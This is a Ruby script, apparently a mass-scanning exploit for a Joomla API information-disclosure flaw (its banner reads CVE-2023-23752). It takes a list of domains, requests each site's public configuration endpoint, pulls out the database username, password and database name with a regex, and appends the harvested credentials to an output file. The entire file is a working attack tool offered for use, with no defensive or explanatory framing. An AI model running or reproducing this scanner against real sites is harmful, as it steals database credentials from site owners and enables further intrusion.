require 'httparty'
require 'colorize'
require 'timeout'

color = "
        
╔═══╦╗░░╔╦═══╗░╔═══╦═══╦═══╦═══╗░░╔═══╦═══╦═══╦═══╦═══╗
║╔═╗║╚╗╔╝║╔══╝░║╔═╗║╔═╗║╔═╗║╔═╗║░░║╔═╗║╔═╗║╔═╗║╔══╣╔═╗║
║║░╚╩╗║║╔╣╚══╗░╚╝╔╝║║║║╠╝╔╝╠╝╔╝║░░╚╝╔╝╠╝╔╝╠╝╔╝║╚══╬╝╔╝║
║║░╔╗║╚╝║║╔═╦╩═╦═╝╔╣║║║╠═╝╔╬╗╚╗╠══╦═╝╔╬╗╚╗║░║╔╩══╗╠═╝╔╝
║╚═╝║╚╗╔╝║╚═╩╦═╣║╚═╣╚═╝║║╚═╣╚═╝╠══╣║╚═╣╚═╝║░║║╔══╝║║╚═╗
╚═══╝░╚╝░╚═══╝░╚═══╩═══╩═══╩═══╝░░╚═══╩═══╝░╚╝╚═══╩═══╝
                coded : [Little_Boy]
"

puts color.colorize(:red)

if ARGV.empty? 
  puts "Usage for multiple target : ruby #{__FILE__} list01.txt output.txt"
  exit
end

list = File.open("#{ARGV[0]}").read
data = list.split("\n")

regex = /"user":"(.*?)".*?"password":"(.*?)".*?"db":"(.*?)"/

data.each do |domain|
  begin
    status = Timeout::timeout(2) do
      request = HTTParty.get("http://#{domain}/api/index.php/v1/config/application?public=true", follow_redirects: false)
      puts

      if request.body.match(regex)
        user = $1
        password = $2
        db = $3

        if user.empty? || password.empty? || db.empty?
          puts "[-] => User, password, or database is empty".colorize(:red)
          next
        end

        puts "[+] => Vulnerable #{domain}".colorize(:yellow)
        puts "User: #{user} Password: #{password} Database: #{db}"
        File.open("#{ARGV[1]}","a+"){|file|file.write("#{domain} user:#{user} password:#{password} database:#{db}\n")}
        puts "File Saved => #{Dir.pwd}/#{ARGV[1]}".yellow
      else
        puts '[-] => Not Vulnerable'.colorize(:red)
      end
    end
  rescue OpenSSL::SSL::SSLError
    puts
    puts "[-] => SSL Error...".red
  rescue Errno::ECONNREFUSED
    puts
    puts "[-] => Connection Refused!".red 
  rescue Timeout::Error
    puts
    puts "[-] => Time Out...".red
  rescue Errno::ECONNRESET
    puts
    puts "[-] => Connection Reset...".red
  rescue SocketError => e
    if e.message.include?("nodename nor servname provided") || e.message.include?("Name or service not known")
      puts "[-] => Invalid URL: #{domain}"
    else
      puts "[-] => Error: #{e.message}"
    end
    puts "[-] => Please enter IP or domain name instead of http or https"
  rescue Errno::ENOENT => e
    if e.message.include?("No such file or directory")
      puts "[-] => Invalid URL: #{domain}"
    else
      puts "[-] => Error: #{e.message}"
    end
  rescue URI::InvalidURIError
    puts "[-] => Invalid URL: #{domain}"
    puts "[-] => Please enter IP or domain name instead of http or https"
  rescue Interrupt
    puts "Leaving The Program"
    exit
  end
end
